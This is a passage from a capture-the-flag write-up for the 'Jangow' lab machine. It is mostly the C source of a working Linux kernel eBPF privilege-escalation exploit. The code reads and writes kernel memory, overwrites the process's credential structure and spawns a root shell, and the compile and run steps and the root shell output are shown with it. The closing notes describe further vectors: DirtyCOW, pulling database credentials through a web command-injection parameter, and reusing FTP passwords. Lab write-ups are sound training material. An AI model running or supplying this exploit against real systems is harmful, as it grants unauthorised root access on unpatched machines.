<span class="w">    </span><span class="kt">ssize_t</span><span class="w"> </span><span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">write</span><span class="p">(</span><span class="n">sockets</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="w"> </span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">n</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;write&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">n</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;short write: %zd</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">n</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span>
<span class="nf">update_elem</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">bpf_update_elem</span><span class="p">(</span><span class="n">mapfd</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">value</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">fail</span><span class="p">(</span><span class="s">&quot;bpf_update_elem failed &#39;%s&#39;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span>
<span class="nf">get_value</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">value</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">bpf_lookup_elem</span><span class="p">(</span><span class="n">mapfd</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">value</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">fail</span><span class="p">(</span><span class="s">&quot;bpf_lookup_elem failed &#39;%s&#39;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">value</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span>
<span class="nf">sendcmd</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">op</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">update_elem</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">op</span><span class="p">);</span>
<span class="w">    </span><span class="n">update_elem</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">addr</span><span class="p">);</span>
<span class="w">    </span><span class="n">update_elem</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">);</span>
<span class="w">    </span><span class="n">writemsg</span><span class="p">();</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">get_value</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span>
<span class="nf">get_skbuff</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">sendcmd</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span>
<span class="nf">get_fp</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">sendcmd</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span>
<span class="nf">read64</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">addr</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">sendcmd</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span>
<span class="nf">write64</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">val</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="n">sendcmd</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="n">val</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="nf">find_cred</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">uid_t</span><span class="w"> </span><span class="n">uid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getuid</span><span class="p">();</span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">skbuff</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_skbuff</span><span class="p">();</span>
<span class="w">    </span><span class="cm">/*</span>
<span class="cm">     * struct sk_buff {</span>
<span class="cm">     *     [...24 byte offset...]</span>
<span class="cm">     *     struct sock     *sk;</span>
<span class="cm">     * };</span>
<span class="cm">     *</span>
<span class="cm">     */</span>

<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">sock_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read64</span><span class="p">(</span><span class="n">skbuff</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">24</span><span class="p">);</span>
<span class="w">    </span><span class="n">msg</span><span class="p">(</span><span class="s">&quot;skbuff =&gt; %llx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">skbuff</span><span class="p">);</span>
<span class="w">    </span><span class="n">msg</span><span class="p">(</span><span class="s">&quot;Leaking sock struct from %llx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">sock_addr</span><span class="p">);</span><span class="w">  </span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">sock_addr</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">PHYS_OFFSET</span><span class="p">){</span>
<span class="w">        </span><span class="n">fail</span><span class="p">(</span><span class="s">&quot;Failed to find Sock address from sk_buff.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w">   </span>

<span class="w">    </span><span class="cm">/*</span>
<span class="cm">     * scan forward for expected sk_rcvtimeo value.</span>
<span class="cm">     *</span>
<span class="cm">     * struct sock {</span>
<span class="cm">     *    [...]</span>
<span class="cm">     *    const struct cred      *sk_peer_cred; </span>
<span class="cm">     *    long                    sk_rcvtimeo;             </span>
<span class="cm">     *  };</span>
<span class="cm">     */</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">100</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">,</span><span class="w"> </span><span class="n">sock_addr</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">read64</span><span class="p">(</span><span class="n">sock_addr</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0x7FFFFFFFFFFFFFFF</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">cred_struct</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read64</span><span class="p">(</span><span class="n">sock_addr</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">cred_struct</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">PHYS_OFFSET</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="k">continue</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>

<span class="w">            </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">test_uid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">read64</span><span class="p">(</span><span class="n">cred_struct</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xFFFFFFFF</span><span class="p">);</span>

<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">test_uid</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">uid</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="k">continue</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">                        </span><span class="n">msg</span><span class="p">(</span><span class="s">&quot;Sock-&gt;sk_rcvtimeo at offset %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
<span class="w">                        </span><span class="n">msg</span><span class="p">(</span><span class="s">&quot;Cred structure at %llx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">cred_struct</span><span class="p">);</span>
<span class="w">            </span><span class="n">msg</span><span class="p">(</span><span class="s">&quot;UID from cred structure: %d, matches the current: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">test_uid</span><span class="p">,</span><span class="w"> </span><span class="n">uid</span><span class="p">);</span>

<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">cred_struct</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">fail</span><span class="p">(</span><span class="s">&quot;failed to find sk_rcvtimeo.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span>
<span class="nf">hammer_cred</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">addr</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">msg</span><span class="p">(</span><span class="s">&quot;hammering cred structure at %llx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">addr</span><span class="p">);</span>
<span class="cp">#define w64(w) { write64(addr, (w)); addr += 8; }</span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">val</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xFFFFFFFFUL</span><span class="p">;</span>
<span class="w">    </span><span class="n">w64</span><span class="p">(</span><span class="n">val</span><span class="p">);</span><span class="w"> </span>
<span class="w">    </span><span class="n">w64</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"> </span><span class="n">w64</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"> </span><span class="n">w64</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"> </span><span class="n">w64</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="w">    </span><span class="n">w64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">);</span><span class="w"> </span>
<span class="w">    </span><span class="n">w64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">);</span><span class="w"> </span>
<span class="w">    </span><span class="n">w64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">);</span><span class="w"> </span>
<span class="cp">#undef w64</span>
<span class="p">}</span>

<span class="kt">int</span>
<span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">initialize</span><span class="p">();</span>
<span class="w">    </span><span class="n">hammer_cred</span><span class="p">(</span><span class="n">find_cred</span><span class="p">());</span>
<span class="w">    </span><span class="n">msg</span><span class="p">(</span><span class="s">&quot;credentials patched, launching shell...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">execl</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="n">c</span>
<span class="w">        </span><span class="n">fail</span><span class="p">(</span><span class="s">&quot;exec %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div></td></tr></table></div>
<p>Compile with:</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>gcc exploit.c -o exploit
</code></pre></div></td></tr></table></div>
<p>Execute:</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>./exploit
</code></pre></div></td></tr></table></div>
<p>And you are root</p>
<p><img alt="image-20211117000924690" src="../assets/image-20211117000924690.png" /></p>
<p>After that you can go into the root folder and cat the <code>proof.txt</code></p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span></pre></div></td><td class="code"><div><pre><span></span><code># cd /root
# ls
proof.txt
# cat proof.txt
                       @@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                          
                       @  @@@@@@@@@@@@@@@&amp;#   #@@@@@@@@&amp;(.    /&amp;@@@@@@@@@@                          
                       @  @@@@@@@@@@&amp;( .@@@@@@@@&amp;%####((//#&amp;@@@&amp;   .&amp;@@@@@                          
                       @  @@@@@@@&amp;  @@@@@@&amp;@@@@@&amp;%######%&amp;@*   ./@@*   &amp;@@                          
                       @  @@@@@* (@@@@@@@@@#/.               .*@.  .#&amp;.   &amp;@@@&amp;&amp;                    
                       @  @@@, /@@@@@@@@#,                       .@.  ,&amp;,   @@&amp;&amp;                    
                       @  @&amp;  @@@@@@@@#.         @@@,@@@/           %.  #,   %@&amp;                    
                       @@@#  @@@@@@@@/         .@@@@@@@@@@            *  .,    @@                   
                       @@&amp;  @@@@@@@@*          @@@@@@@@@@@             ,        @                   
                       @&amp;  .@@@@@@@(      @@@@@@@@@@@@@@@@@@@@@        *.       &amp;@                  
                      @@/  *@@@@@@@/           @@@@@@@@@@@#                      @@                 
                      @@   .@@@@@@@/          @@@@@@@@@@@@@              @#      @@                 
                      @@    @@@@@@@@.          @@@@@@@@@@@              @@(      @@                 
                       @&amp;   .@@@@@@@@.         , @@@@@@@ *            .@@@*(    .@                  
                       @@    ,@@@@@@@@,   @@@@@@@@@&amp;*%@@@@@@@@@,    @@@@@(%&amp;*   &amp;@                  
                       @@&amp;     @@@@@@@@@@@@@@@@@         (@@@@@@@@@@@@@@%@@/   &amp;@                   
                       @ @&amp;     ,@@@@@@@@@@@@@@@,@@@@@@@&amp;%@@@@@@@@@@@@@@@%*   &amp;@                    
                       @  @@.     .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*    &amp;@&amp;                    
                       @  @@@&amp;       ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%/     &amp;@@&amp;&amp;                    
                       @  @@@@@@.        *%@@@@@@@@@@@@@@@@@@@@&amp;#/.      &amp;@@@@&amp;&amp;                    
                       @  @@@@@@@@&amp;               JANGOW               &amp;@@@                          
                       @  &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@&amp;     @@(&amp;@ @. %.@ @@%@     &amp;@@@&amp;&amp;&amp;&amp;                          
                                     &amp;&amp;&amp;@@@@&amp;%       &amp;/    (&amp;&amp;@@@&amp;&amp;&amp;                                
                                       (((((((((((((((((((((((((((((





hash-is-here
</code></pre></div></td></tr></table></div>
<h3 id="possible-rabbit-holes-or-different-attack-vectors">Possible rabbit holes or different attack vectors</h3>
<h4 id="dirtycow">DirtyCOW</h4>
<p>A dirtyCOW should have been possible since the kernel version on the victim machine is 4.4.0-31 and the earliest fixed version in Ubuntu 16.04 LTS is kernel version 4.4.0-45. Applying the different dirtyCOW resulted in unstable system or reboots. </p>
<h4 id="the-wordpress-folder">The wordpress folder</h4>
<p>The wordpress folder was empty except the config.php. In the config.php we can get the mysql credentials. Since I got better attack vectors, I didn't follow this further. We can get the credentials even without an initial shell if we use the RCE that the homepage provides us. For example, we can use <code>find</code> command like <code>find+/var/www/html</code> as the value for the parameter <code>buscar</code> and we'll find the file <code>.backup</code> containing the credentials</p>
<p><img alt="image-20211117104026026" src="../assets/image-20211117104026026-16371420269411.png" /></p>
<h4 id="the-ftp-credentials">The ftp credentials</h4>
<p>Reusing the user and password credential we get from <code>config.php</code> or <code>/var/www/html/.backup</code>, we can login to ftp. After getting the initial shell we can use the credentials to <code>su</code> as the user jangow01. Anyway, the initial attack vector is still more promising so we don't follow this vector</p>
<h4 id="the-backup-file-in-the-script-folder">The backup file in the /script folder</h4>
<p>There is a backup executable in the /script folder but I couldn't use it to escalate privileges. No <code>setuid</code> on the file and nothing with <code>sudo -l</code> or with <code>crontab -l</code></p>





                 <!-- Giscus -->
  <h3 id="__comments">Comments</h2>
  <p>Any feedback and suggestions are welcome. This website was created using mkdocs and the material plugin. If you
    want, you can make a pull request. The repository is <a
      href="https://github.com/dabonzo/itsec_hp">https://github.com/dabonzo/itsec_hp</a></p>
  <script src="https://giscus.app/client.js" data-repo="dabonzo/itsec_hp" data-repo-id="R_kgDOH0fBLg"
    data-category="General" data-category-id="DIC_kwDOH0fBLs4CQ1Al" data-mapping="pathname" data-strict="0"
    data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="preferred_color_scheme"
    data-lang="en" crossorigin="anonymous" async>
    </script>

  <!-- Synchronize Giscus theme with palette -->
  <script>
    var giscus = document.querySelector("script[src*=giscus]")

    /* Set palette on initial load */
    var palette = __md_get("__palette")
    if (palette && typeof palette.color === "object") {
      var theme = palette.color.scheme === "slate" ? "dark" : "light"
      giscus.setAttribute("data-theme", theme)


    }

    /* Register event handlers after documented loaded */
    document.addEventListener("DOMContentLoaded", function () {
      var ref = document.querySelector("[data-md-component=palette]")
      ref.addEventListener("change", function () {
        var palette = __md_get("__palette")
        if (palette && typeof palette.color === "object") {
          var theme = palette.color.scheme === "slate" ? "dark" : "light"

          /* Instruct Giscus to change theme */
          var frame = document.querySelector(".giscus-frame")
          frame.contentWindow.postMessage(
            { giscus: { setConfig: { theme } } },
            "https://giscus.app"
          )
        }
      })
    })
  </script>
  
              </article>
            </div>
          
          
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
            Back to top
          </button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    <script id="__config" type="application/json">{"base": "../../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "search.suggest", "navigation.sections", "navigation.top", "content.code.annotate"], "search": "../../../../../assets/javascripts/workers/search.dfff1995.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../../../../assets/javascripts/bundle.dff1b7c8.min.js"></script>
      
    
  </body>
</html>